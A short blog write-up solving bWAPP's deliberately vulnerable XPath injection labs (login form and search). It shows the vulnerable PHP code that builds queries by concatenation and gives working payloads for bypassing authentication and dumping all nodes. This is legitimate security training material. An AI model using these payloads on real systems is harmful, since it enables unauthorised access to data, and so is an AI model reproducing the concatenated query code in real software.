---
title: "BWAPP XML/XPath Injection (Login Form/search)"
date: 2019-01-18 00:00:00 +0530
categories: [Writeups]
tags: [Bwapp]
description: "BWAPP XML/XPath Injection Login Form and search solution"
permalink: /Writeups/bwapp-xml-xpath/
redirect_from:
  - /bwapp-xml-xpath
  - /bwapp-xml-xpath/
archived: true
---


# BWAPP A1 - Injection


## XML/XPath Injection (Login Form):

Sample xml data is as below,

```xml
<?xml version="1.0" encoding="utf-8"?>
<Employees>
   <Employee ID="1">
      <FirstName>Arnold</FirstName>
      <LastName>Baker</LastName>
      <UserName>ABaker</UserName>
      <Password>SoSecret</Password>
      <Type>Admin</Type>
   </Employee>
   <Employee ID="2">
      <FirstName>Peter</FirstName>
      <LastName>Pan</LastName>
      <UserName>PPan</UserName>
      <Password>NotTelling</Password>
      <Type>User</Type>
   </Employee>
</Employees>
```

The source code is, 
```
$xml = simplexml_load_file("passwords/heroes.xml");
$result = $xml->xpath("/heroes/hero[login='" . $login . "' and password='" . $password . "']");
```

To find whether its XML injection or not, its similar to SQL injection. Use single quote `'` and error shows you XML and XPath is used.

### LOW LEVEL :

Here without login password validation, Data can be accessed using **id** in the XML as below. 

`blah' or id='2` this payload is getting the user detail of 2nd user. Accordingly, other user data also can be accessed.

another payload,
```
blah' or 1=1 or '
```

### MEDIUM LEVEL :

In this, medium level and high level are same.

## XML/XPath Injection (search):

This injection is more of a blind XML/XPath.

### LOW LEVEL :

payload is, 
```
')]/child::node() | blah[contains(blah,'
```
Payload should be in genre field, then updated Url is
```
localhost/bwapp/xmli_2.php?genre=%27)]/child::node()%20|%20blah[contains(blah,%27&action=search
```
Entity name is unknown. So, `child::node()` is to select all the node. That's why it prints all the data.

The source code is,
```
$result = $xml->xpath("//hero[contains(genre, '$genre')]/movie");
```

### MEDIUM LEVEL :

In this, medium level and high level are same.

## Reference

```
https://www.owasp.org/index.php/XPATH_Injection
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
```
